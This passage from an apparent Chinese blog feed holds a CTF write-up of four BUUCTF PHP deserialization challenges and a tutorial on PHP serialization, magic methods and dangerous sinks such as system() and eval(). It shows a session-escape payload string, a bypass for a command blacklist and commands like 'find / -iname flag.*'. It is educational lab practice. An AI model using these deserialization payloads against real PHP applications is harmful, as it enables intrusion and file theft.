        <category term="http" />
        <updated>2021-07-08T14:30:37.254Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/07/04/ctf/web/pop/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
        <title>(ctfwp)buu中php反序列化</title>
        <link rel="alternate" href="http://imfanqie.top/2021/07/04/ctf/web/pop/(ctfwp)buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
        <content type="html">&lt;p&gt;上一篇整理了 php 反序列化的知识点，本文是我对练习中题目的整理。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;1极客大挑战-2019php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1极客大挑战-2019php&#34;&gt;#&lt;/a&gt; 1.[极客大挑战 2019] PHP&lt;/h1&gt;
&lt;p&gt;进入页面，根据提示，考虑备份导致源码泄露。&lt;/p&gt;
&lt;p&gt;于是用扫描工具（ctfwscan）进行目录扫描，发现备份文件可以成功访问，如图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/Ouvbscq5zn4E861.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后下载下来，打开，有五个文件：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/H4BEaOX18qYLokA.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;尝试 flag.php 后不对，审计 class.php 和 index.php，找到了可反序列化点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/lbBoGf4YnR3yIzK.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;因为包含了 class.php 文件，所以审计 class.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/3gmMvuYZWj5ipn7.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;class 中没有调用类，根据 index 中代码，只是进行了反序列化。&lt;/p&gt;
&lt;p&gt;根据流程分析，先__wakeup ()，然后__destruct ()。&lt;/p&gt;
&lt;p&gt;在 destruct () 中，当 password == 100，username === admin 时，能读取 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/lGzHsKJQyj4hmE2.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;但是在 wakeup () 时，username 会被赋值为 guest，会使我们输入的值改变，导致无法获取答案。&lt;/p&gt;
&lt;p&gt;此时我们只需改对象属性个数绕过 wakeup () 即可：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/qfRyJZDdMrTK4SC.png&#34; alt=&#34;1.6.png&#34;&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;打入 payload，得到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/F26yv5sJglwTXrx.png&#34; alt&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;2网鼎杯-2020-青龙组areuserialz&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2网鼎杯-2020-青龙组areuserialz&#34;&gt;#&lt;/a&gt; 2.[网鼎杯 2020 青龙组] AreUSerialz&lt;/h1&gt;
&lt;p&gt;据说是当年的签到题，作为一个新手，当然要玩一下&lt;/p&gt;
&lt;p&gt;进去直接给了原码，先复制到本地，找反序列化点：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/SdDn42CxHQGYAaP.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后审计代码，同第一题，但没有 wakeup ()，如果反序列化直接会 destruct ()&lt;/p&gt;
&lt;p&gt;但再反序列化前，需要先绕过 is_valid () 中的 ascll 检查（私有类需要 %00）&lt;/p&gt;
&lt;p&gt;在 destruct () 中，当 op === &amp;quot;2&amp;quot; 时，会被强制为 &amp;quot;1&amp;quot;，当 op == &amp;quot;1&amp;quot; 时，沿着代码走下去发现只能写，不能读，无法找到 flag；而当 op == &amp;quot;2&amp;quot; 时，通过 file_get_contents () 函数可以读到 filename，如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/MI4jDV3f6cmYRoa.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;所以我们的目标 1. 绕过 op === &amp;quot;2&amp;quot; 时的强制转换   2. 绕过私有属性时的 ascll 检测&lt;/p&gt;
&lt;p&gt;解决方法：&lt;/p&gt;
&lt;p&gt;1. 当 op === &amp;quot;2&amp;quot; 时才会转换，所以当 op == &amp;quot;2&amp;quot; 时，不会强制转换，因为后者没有对类型强制要求，所以只需让 op = 2  （int 型），在判断时不会因为类型而引起强制转换，即绕过。&lt;/p&gt;
&lt;p&gt;2. 有以下两个方法，第一个更常用：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// PHP7.1 以上版本对属性类型不敏感，可以用 public 属性来绕过检查&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;本题第二个绕过我选择第一种方法，如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/CANDRsYMy3PUqQc.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;打入 payload，在注释中得到 flag，如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/sVug5h7UnfCzjSG.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;h1 id=&#34;3网鼎杯-2020-朱雀组phpweb&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3网鼎杯-2020-朱雀组phpweb&#34;&gt;#&lt;/a&gt; 3.[网鼎杯 2020 朱雀组] phpweb&lt;/h1&gt;
&lt;p&gt;进去页面后发现五秒刷新一次，还会出现警告 warning，如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/vREfAQ4MzBOsNuZ.png&#34; alt=&#34;3.1.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;用 bp 抓一下包，发现一直在传送两条数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/4SKAOMwm1QfLWnr.png&#34; alt&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;百度了一下，发现可能有函数执行的操作&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/QmlZz9xS1tF72JR.png&#34; alt&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;根据函数 file_get_contents 读取信息，于是得到 index.php：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/LcBgh6D1aXkdREb.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;考虑通过 system、passthur 或者 exec 执行命令读取信息，但是可以发现第 24 行已经将它们在 func 中屏蔽掉。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/IZp5PFnGTN6kziW.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;就是说其不能作为函数，但是我们可以用反序列化 unserialize () 绕过&lt;/p&gt;
&lt;p&gt;先序列化构造 payload&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/jT8fVUkthDFI3RY.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后再通过 bp 传一次参&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/7uZMj9wfdoaTk4r.png&#34; alt&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;p&gt;由于找不到有用的信息，于是百度后，我 get 到了新方法！！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;find 用法：&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;find path -option [ -print ] [ -exec -ok command ] {} ;&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;path： . 代表当前路径，/ 代表总目录&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt; - name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt; name 可以使用通配符，如 “flag.*”&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLWZpbmQuaHRtbA==&#34;&gt;菜鸟教程 find 用法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;所以可以构造 find /-iname&amp;quot;flag.*&amp;quot;, 然后序列化得到字符串：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/DV54UAlcZgivWMu.png&#34; alt&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;然后继续用 bp 传参，找到 flag 文件，通过 readfile 或 file_get_contents 读取 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/a2fITqS4G5ktVNE.png&#34; alt&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/vX1QCnoheuZRB4b.png&#34; alt&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;4安洵杯-2019easy_serialize_php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4安洵杯-2019easy_serialize_php&#34;&gt;#&lt;/a&gt; 4.[安洵杯 2019] easy_serialize_php&lt;/h1&gt;
&lt;p&gt;进入网站就能看到原码，先复制到本地&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/HoBFiM4TEJUfYtj.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;先审计代码，在 31 行找到序列化函数，在 38 行找到但反列化函数，且参数可控通过 get 传参&lt;/p&gt;
&lt;p&gt;所以，根据提示先让 $function = phpinfo，通过 bp 传参（或是直接在浏览器输入）&lt;/p&gt;
&lt;p&gt;我先用的 bp，出现代码后复制到本地，查找 flag、ag、fl、f1ag 等等相关名词，成功找到文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/ct24bNzhofQ9BvD.png&#34; alt=&#34;4.2.png&#34;&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;后来又试了一下网址直接传，大概浏览了一遍也能找到。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/HnglVwDsRmkUfZy.png&#34; alt=&#34;4.3.png&#34;&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;知道了文件名，无法直接读，所以准备用代码中的 file_get_contents () 函数读取&lt;/p&gt;
&lt;p&gt;所以需要让 base64_decode ($userinfo [‘img’]) = d0g3_f1ag.php ，根据百度进行 base64 加密，&lt;/p&gt;
&lt;p&gt;就需要让 $userinfo [‘img’] = ZDBnM19mMWFnLnBocA==&lt;/p&gt;
&lt;p&gt;又因为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mtext&gt;‘&lt;/mtext&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mtext&gt;’&lt;/mtext&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;是由&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;userinfo[‘img’]是由&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;‘&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;’&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;由&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; serialize_info 反序列化得到的&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mtext&gt;又是由&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;serialize_info又是由&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;又&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;由&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_SESSION 序列化然后过滤得到的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/H85V3LjgGR26Fmh.png&#34; alt&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;p&gt;但是如果对 $_SESSION [&#39;img&#39;] 赋值，则会被 sha1 进行再次加密，且不可逆，无法得到答案&lt;/p&gt;
&lt;p&gt;所以只能从过滤函数过滤序列化字符串处开始下手&lt;/p&gt;
&lt;p&gt;此处参考了 https://blog.csdn.net/qq_43622442/article/details/106003691&lt;/p&gt;
&lt;p&gt;当中对对象逃逸问题有详细的说明：（我还在参悟这东西，实在头大）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/qbxrYCc8yPMOw1d.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token constant&#34;&gt;_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;flagflagflagflagflagflag&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;_SESSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;a&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:8:&#34;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:7:&#34;&lt;/span&gt;xxx&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:3:&#34;&lt;/span&gt;img&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;s:20:&#34;&lt;/span&gt;ZDBnM19mMWFnLnBocA&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&#34;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后输入后查看源码有注释：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/2O9ufc8rFMBsQyi.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;把 img 文件名加密后一换，长度没变，就能得到 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/06/TfvPdlA9KWGshat.png&#34; alt&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="反序列化" />
        <updated>2021-07-04T14:48:57.312Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/07/04/ctf/web/pop/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
        <title>ctfweb-PHP反序列化</title>
        <link rel="alternate" href="http://imfanqie.top/2021/07/04/ctf/web/pop/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
        <content type="html">&lt;p&gt;学习了一下 php 反序列化漏洞，并做了一些整理。&lt;/p&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;简单理解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简单理解&#34;&gt;#&lt;/a&gt; 简单理解&lt;/h1&gt;
&lt;p&gt;serialize 将一个对象转换成一个字符串&lt;br&gt;
 unserialize 将一个字符串还原成一个对象&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;序列化：&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/j8PEukm6tS3hxL1.png&#34; alt&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;p&gt;如图所示:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;O:6:&amp;quot;People&amp;quot;:2:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;jack&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;就是我们输入的 people 信息经过序列化得到的字符串，其中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/OjPnzYag1oLSsQW.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;\x00 + 类名 + \x00 + 变量名 反序列化出来的是 private 变量&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;\x00 + * + \x00 + 变量名 反序列化出来的是 protected 变量&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;反序列化&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;我们通过 post 传递这串序列化的字符串，来验证使用 unserialize&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/oUKcSPMQtkHR3IF.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;两者配合引起了问题所在。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;魔术方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#魔术方法&#34;&gt;#&lt;/a&gt; 魔术方法&lt;/h1&gt;
&lt;p&gt;__wakeup () // 使用 unserialize 时触发&lt;br&gt;
__sleep () // 使用 serialize 时触发&lt;/p&gt;
&lt;p&gt;__destruct () // 对象被销毁时触发&lt;/p&gt;
&lt;p&gt;__call () // 在对象上下文中调用不可访问的方法时触发&lt;br&gt;
__callStatic () // 在静态上下文中调用不可访问的方法时触发&lt;/p&gt;
&lt;p&gt;__get () // 用于从不可访问的属性读取数据&lt;br&gt;
__set () // 用于将数据写入不可访问的属性&lt;/p&gt;
&lt;p&gt;__isset () // 在不可访问的属性上调用 isset () 或 empty () 触发&lt;br&gt;
__unset () // 在不可访问的属性上使用 unset () 时触发&lt;/p&gt;
&lt;p&gt;__toString () // 把类当作字符串使用时触发&lt;br&gt;
__invoke () // 当脚本尝试将对象调用为函数时触发&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;最常用的：&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__construct，构造函数，PHP 5 允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初 始化工作。 
__toString，打印一个对象时，如果定义了__toString()方法，就能在测试时，通过echo 打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含 的数据。
__destruct，析构函数，PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言， 如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 
__sleep magic方法在一个对象被序列化的时候调用。 
__wakeup magic方法在一个对象被反序列化的时候调用。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/aH1BTjV4I3kn8Ld.png&#34; alt&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/07/04/Ir6gTMOGWeV5xkA.png&#34; alt&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;php反序列化漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php反序列化漏洞&#34;&gt;#&lt;/a&gt; php 反序列化漏洞&lt;/h1&gt;
&lt;p&gt;PHP 反序列化漏洞又叫 PHP 对象注入漏洞，反序列化的数据本质上来说是没有危害的，但是在 反序列化参数可控时，可能会产生严重的安全威胁。当传给  unserialize () 的参数可控时， 我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。&lt;/p&gt;
&lt;p&gt;攻击流程就是在本地写一个序列化的文件，拿得到的字符串去打远程&lt;/p&gt;
&lt;p&gt;重点关注的函数：&lt;br&gt;
代码执行：eval ()      assert ()&lt;br&gt;
 命令执行：exec ()      passthru ()      system ()      popen ()&lt;br&gt;
&lt;strong&gt; 文件操作&lt;/strong&gt;：file_put_contents ()      file_get_contents ()      unlink ()&lt;/p&gt;
&lt;p&gt;常用：&lt;/p&gt;
&lt;p&gt;exec — 执行一个外部程序（exec (whoami)）&lt;/p&gt;
&lt;p&gt;passthru — 执行外部程序并且显示原始输出，同上&lt;/p&gt;
&lt;p&gt;system — 执行外部程序，并且显示输出（system (whoami)、system (ls)）&lt;/p&gt;
&lt;p&gt;file_get_contents — 将整个文件读入一个字符串（file_get_contents (flag.php)）&lt;/p&gt;
&lt;p&gt;unlink — 删除文件&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;下一篇做题练手&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;END&lt;/p&gt;
</content>
        <category term="反序列化" />
        <updated>2021-07-04T10:33:13.829Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2021/07/01/program/php/phpstudy/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
        <title>php的浅显学习中一些知识点</title>
